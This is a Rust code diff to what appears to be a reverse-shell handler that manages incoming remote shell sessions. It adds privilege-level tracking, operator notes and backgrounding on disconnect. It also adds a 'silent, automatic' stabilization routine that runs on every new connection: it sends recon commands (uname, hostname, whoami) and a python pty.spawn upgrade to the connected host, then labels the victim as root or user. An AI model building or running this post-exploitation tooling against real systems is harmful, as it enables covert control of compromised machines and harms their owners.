@@ -17,24 +17,36 @@ pub enum ShellState {
     Terminated,
 }
 
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum PrivilegeLevel {
+    Root,
+    User,
+    Unknown,
+}
+
 #[derive(Debug, Clone)]
 pub struct ShellMetadata {
     pub remote_addr: String,
     pub hostname: Option<String>,
     pub username: Option<String>,
     pub os_type: Option<String>,
+    pub privilege: PrivilegeLevel,
     pub connected_at: DateTime<Utc>,
+    pub last_seen: DateTime<Utc>,
+    pub operator_notes: Option<String>,
 }
 
 pub struct ShellSession {
     pub id: String,
     pub name: String,
-    pub metadata: ShellMetadata,
+    pub metadata: Arc<RwLock<ShellMetadata>>,
     pub state: Arc<RwLock<ShellState>>,
     pub stream: Arc<RwLock<Option<TcpStream>>>,
     pub output_buffer: Arc<RwLock<Vec<String>>>,
     pub input_tx: mpsc::UnboundedSender<String>,
     pub output_rx: Arc<RwLock<mpsc::UnboundedReceiver<String>>>,
+    pub reconnect_attempts: Arc<RwLock<u32>>,
+    pub max_reconnect_attempts: u32,
 }
 
 impl ShellSession {
@@ -51,7 +63,10 @@ impl ShellSession {
             hostname: None,
             username: None,
             os_type: None,
+            privilege: PrivilegeLevel::Unknown,
             connected_at: Utc::now(),
+            last_seen: Utc::now(),
+            operator_notes: None,
         };
 
         let state = Arc::new(RwLock::new(ShellState::Active));
@@ -84,13 +99,78 @@ impl ShellSession {
         Ok(Self {
             id,
             name,
-            metadata,
+            metadata: Arc::new(RwLock::new(metadata)),
             state,
             stream: stream_arc,
             output_buffer,
             input_tx,
             output_rx: Arc::new(RwLock::new(output_rx)),
+            reconnect_attempts: Arc::new(RwLock::new(0)),
+            max_reconnect_attempts: 3,
         })
+    }
+
+    pub async fn handle_disconnect(&self) {
+        // Graceful disconnect handling - set state to background
+        // This allows the session manager to keep track without terminating
+        *self.state.write().await = ShellState::Background;
+        
+        // Could implement reconnection logic here if needed
+        let attempts = *self.reconnect_attempts.read().await;
+        if attempts < self.max_reconnect_attempts {
+            // Increment reconnect attempts
+            *self.reconnect_attempts.write().await = attempts + 1;
+            
+            // In a production system, you might:
+            // 1. Attempt to reconnect using stored connection info
+            // 2. Set up a callback mechanism
+            // 3. Preserve session state for continuity
+            
+            info!("Session {} disconnected, attempt {}/{}", 
+                  self.id, attempts + 1, self.max_reconnect_attempts);
+        } else {
+            // Max attempts reached, mark as terminated
+            *self.state.write().await = ShellState::Terminated;
+            info!("Session {} terminated after {} reconnect attempts", 
+                  self.id, self.max_reconnect_attempts);
+        }
+    }
+
+    pub async fn update_metadata<F>(&self, f: F) 
+    where
+        F: FnOnce(&mut ShellMetadata),
+    {
+        let mut metadata = self.metadata.write().await;
+        f(&mut *metadata);
+        metadata.last_seen = Utc::now();
+    }
+
+    pub async fn get_metadata(&self) -> ShellMetadata {
+        self.metadata.read().await.clone()
+    }
+
+    pub async fn set_notes(&self, notes: String) {
+        let mut metadata = self.metadata.write().await;
+        metadata.operator_notes = Some(notes);
+    }
+
+    pub async fn detect_privilege(&self) -> PrivilegeLevel {
+        // Auto-detect based on output patterns
+        let buffer = self.output_buffer.read().await;
+        let output = buffer.join("");
+        
+        if output.contains("# ") || output.contains("root@") || output.contains("Administrator") {
+            PrivilegeLevel::Root
+        } else if output.contains("$ ") || output.contains("C:\\") || output.contains("PS ") {
+            PrivilegeLevel::User
+        } else {
+            PrivilegeLevel::Unknown
+        }
+    }
+
+    pub fn session_age(&self) -> std::time::Duration {
+        // Note: This is a placeholder - actual age calculated at display time
+        std::time::Duration::from_secs(0)
     }
 
     async fn handle_io(
@@ -116,8 +196,15 @@ impl ShellSession {
                 result = reader.read_buf(&mut read_buf) => {
                     match result {
                         Ok(0) => {
+                            // Connection closed gracefully
                             info!("Shell session {} disconnected", id);
-                            *state.write().await = ShellState::Terminated;
+                            
+                            // Don't immediately terminate - allow reconnection
+                            *state.write().await = ShellState::Background;
+                            
+                            // Send notification to output channel
+                            let _ = output_tx.send("\n[Connection lost - session backgrounded]\n".to_string());
+                            
                             break;
                         }
                         Ok(n) => {
@@ -132,7 +219,11 @@ impl ShellSession {
                         }
                         Err(e) => {
                             error!("Read error on shell session {}: {}", id, e);
-                            *state.write().await = ShellState::Terminated;
+                            
+                            // Network error - background instead of terminate
+                            *state.write().await = ShellState::Background;
+                            let _ = output_tx.send(format!("\n[Network error: {} - session backgrounded]\n", e));
+                            
                             break;
                         }
                     }
@@ -142,12 +233,14 @@ impl ShellSession {
                 Some(command) = input_rx.recv() => {
                     if let Err(e) = writer.write_all(command.as_bytes()).await {
                         error!("Write error on shell session {}: {}", id, e);
-                        *state.write().await = ShellState::Terminated;
+                        *state.write().await = ShellState::Background;
+                        let _ = output_tx.send(format!("\n[Write error: {} - session backgrounded]\n", e));
                         break;
                     }
                     if let Err(e) = writer.flush().await {
                         error!("Flush error on shell session {}: {}", id, e);
-                        *state.write().await = ShellState::Terminated;
+                        *state.write().await = ShellState::Background;
+                        let _ = output_tx.send(format!("\n[Flush error: {} - session backgrounded]\n", e));
                         break;
                     }
                 }
@@ -217,11 +310,18 @@ impl ShellSessionManager {
         let session = ShellSession::new(session_id.clone(), remote_addr, stream).await?;
         
         info!(
-            "🐚 New shell session registered: {} from {}",
+            "New shell session registered: {} from {}",
             session_id, remote_addr
         );
 
         let session_arc = Arc::new(session);
+        
+        // Start automatic shell stabilization
+        let session_clone = session_arc.clone();
+        tokio::spawn(async move {
+            Self::stabilize_shell(session_clone).await;
+        });
+        
         self.sessions.insert(session_id.clone(), session_arc);
 
         // Set as active if no active session
@@ -246,6 +346,9 @@ impl ShellSessionManager {
             remote_addr: String,
             state: String,
             connected_at: String,
+            hostname: Option<String>,
+            username: Option<String>,
+            privilege: String,
         }
         
         let mut sessions_info = Vec::new();
@@ -257,11 +360,21 @@ impl ShellSessionManager {
                 ShellState::Terminated => "Terminated",
             };
             
+            let metadata = entry.value().get_metadata().await;
+            let privilege_str = match metadata.privilege {
+                PrivilegeLevel::Root => "Root",
+                PrivilegeLevel::User => "User",
+                PrivilegeLevel::Unknown => "Unknown",
+            };
+            
             sessions_info.push(SessionInfo {
                 id: entry.key().clone(),
-                remote_addr: entry.value().metadata.remote_addr.clone(),
+                remote_addr: metadata.remote_addr.clone(),
                 state: state_str.to_string(),
-                connected_at: entry.value().metadata.connected_at.to_rfc3339(),
+                connected_at: metadata.connected_at.to_rfc3339(),
+                hostname: metadata.hostname,
+                username: metadata.username,
+                privilege: privilege_str.to_string(),
             });
         }
         
@@ -377,6 +490,85 @@ impl ShellSessionManager {
 
     pub fn session_count(&self) -> usize {
         self.sessions.len()
+    }
+
+    async fn stabilize_shell(session: Arc<ShellSession>) {
+        // Silent, automatic shell stabilization
+        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
+        
+        // Detect OS
+        let _ = session.send_command("uname -a 2>/dev/null || ver 2>nul\n".to_string()).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
+        
+        // Get hostname
+        let _ = session.send_command("hostname 2>/dev/null || echo %COMPUTERNAME% 2>nul\n".to_string()).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
+        
+        // Get username
+        let _ = session.send_command("whoami 2>/dev/null || echo %USERNAME% 2>nul\n".to_string()).await;
+        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
+        
+        // Stabilize with Python if available (Unix-like)
+        let stabilize_cmd = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null\n";
+        let _ = session.send_command(stabilize_cmd.to_string()).await;
+        
+        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
+        
+        // Export TERM for better compatibility
+        let _ = session.send_command("export TERM=xterm 2>/dev/null\n".to_string()).await;
+        
+        // Parse collected output to update metadata
+        let buffer = session.get_output_buffer().await;
+        let output = buffer.join("");
+        
+        session.update_metadata(|meta| {
+            // Parse OS
+            if output.contains("Linux") {
+                meta.os_type = Some("Linux".to_string());
+            } else if output.contains("Darwin") {
+                meta.os_type = Some("macOS".to_string());
+            } else if output.contains("Windows") || output.contains("Microsoft") {
+                meta.os_type = Some("Windows".to_string());
+            }
+            
+            // Parse hostname (simple extraction)
+            for line in output.lines() {
+                if !line.contains("hostname") && !line.contains("COMPUTERNAME") && line.len() > 2 && line.len() < 50 {
+                    if !line.contains("@") && !line.contains("/") && !line.contains("\\") {
+                        if line.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.') {
+                            meta.hostname = Some(line.trim().to_string());
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            // Parse username
+            for line in output.lines() {
+                if line.contains("\\") && !line.contains("whoami") {
+                    // Windows format: DOMAIN\username
+                    if let Some(username) = line.split('\\').last() {
+                        meta.username = Some(username.trim().to_string());
+                        break;
+                    }
+                } else if !line.contains("whoami") && !line.contains("USERNAME") && line.len() > 2 && line.len() < 30 {
+                    if line.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_') {
+                        meta.username = Some(line.trim().to_string());
+                        break;
+                    }
+                }
+            }
+            
+            // Detect privilege
+            if output.contains("root@") || output.contains("# ") || output.contains("Administrator") || output.contains("SYSTEM") {
+                meta.privilege = PrivilegeLevel::Root;
+            } else if output.contains("$ ") || output.contains("C:\\") || output.contains("PS >") {
+                meta.privilege = PrivilegeLevel::User;
+            }
+        }).await;
+        
+        // Clear the output buffer after stabilization
+        session.clear_output_buffer().await;
     }
 }
 
